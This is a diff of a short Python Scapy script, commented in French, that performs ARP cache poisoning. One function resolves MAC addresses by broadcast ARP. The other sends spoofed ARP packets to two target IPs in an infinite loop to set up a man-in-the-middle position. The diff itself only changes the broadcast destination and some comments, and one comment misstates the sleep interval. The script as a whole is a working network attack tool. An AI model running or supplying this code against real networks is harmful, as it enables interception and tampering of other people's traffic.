@@ -8,7 +8,8 @@ def mac(ip:str)->str:
   '''Recupere l'adresse MAC associer a une adresse IP grace a un message ARP. \n
   ip: est une adresse IP
   '''
-  paquet = Ether()/ARP(op=1, pdst=ip) #Paquet ARP
+  paquet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip) #Paquet ARP evoyer en broadcast 
+  #paquet sert à récuprer une adresse MAC
   rep = srp(paquet, iface='enp0s3') #Reponse au ARP
   return rep[0][0][1].hwsrc #Renvoie l'adresse MAC
 
@@ -16,7 +17,7 @@ def arp(ipa:str, ipb:str)->None:
   '''ARP POISONING: \n
   Procedure permetant de realiser une attaque Man In The Middle par
   empoisonnement de cache ARP. \n
-  ipa: Une des deux adresse IP que l'on veut empoisonner. \n
+  ipa: Une des deux adresse IP que l'on veut empoisonner.
   ipb: L'autre adresse IP que l'on veut empoisonner.
   '''
 
@@ -28,6 +29,6 @@ def arp(ipa:str, ipb:str)->None:
   while True: #Boucle infinie
     sendp(paquet1, iface='enp0s3')
     sendp(paquet2, iface='enp0s3')
-    t.sleep(30) #Arrete le processus pendant 60s
+    t.sleep(30) #Arrete le processus durant 60s
 
 arp(sys.argv[1], sys.argv[2])
